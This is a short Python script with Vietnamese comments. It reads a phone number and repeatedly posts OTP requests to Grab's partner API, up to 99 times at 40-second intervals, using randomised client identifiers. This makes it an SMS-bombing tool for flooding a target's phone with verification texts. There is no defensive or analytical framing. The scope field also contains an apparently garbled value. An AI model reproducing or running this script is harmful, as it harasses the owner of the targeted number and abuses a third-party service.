import requests
import json
import time
import random

def string_rand(length=5):
    consonants="1234567890qwertyuiopasdfghjklzxcvbnm"
    vowels="aeiou"
    return "".join(random.choice((consonants,vowels)[i%2]) for i in range(length))

s = requests.Session()
u = 'https://partner-api.grab.com/grabid/v1/oauth2/otp'
i = 1
l = 100 # 100 lần

print('Enter phone..')
p = input()

payload = { 'client_id': string_rand(32),'country_code': 'VN','ctx_id': string_rand(32),'method': 'SMS', 'num_digits': 6, 'phone_number' : '84' + p, 'scope': 'openid profile.read foodweb.order foodweb.rewastring_rand foodweb.get_enterprise_profile'}  

while (i < l) :
    respone = s.post(u, data=payload, allow_redirects=False)

    #jsons = json.loads(respone.text)

    print('Lần: ',i,respone)

    i = i + 1

    time.sleep(40) 
